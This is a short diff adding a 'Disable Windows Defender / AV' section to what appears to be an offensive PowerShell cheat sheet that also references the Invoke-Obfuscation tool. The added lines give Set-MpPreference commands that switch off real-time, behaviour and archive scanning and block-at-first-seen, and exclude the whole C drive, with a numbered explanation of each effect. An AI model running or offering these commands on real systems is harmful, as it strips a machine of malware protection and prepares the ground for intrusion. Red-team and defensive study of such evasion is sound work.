@@ -86,3 +86,18 @@ Import-module invoke-obfuscation.pd1
 invoke-obfuscation
 Write-Host "{command}" 
 ```
+
+## Disable Windows Defender / AV
+```
+set-MpPreference -DisableRealTimeMonitoring $true -Force
+```
+> Disables AV
+```
+set-MpPreference -DisableArchiveScanning $True -DisableBehaviorMonitoring $True -DisableAutoExclusions $True -DisableBlockAtFirstSeen $True -DisableRealtimeMonitoring $True -ExclusionProcess "C:\" -Force
+```
+1. Disables Zip Scanning
+2. Disable Behaviour Monitoring
+3. Disable Auto Exclusion
+4. Disable Blocking of file at first seeen
+5. Disable Real Time Monitoring
+6. Exluces the C drive 
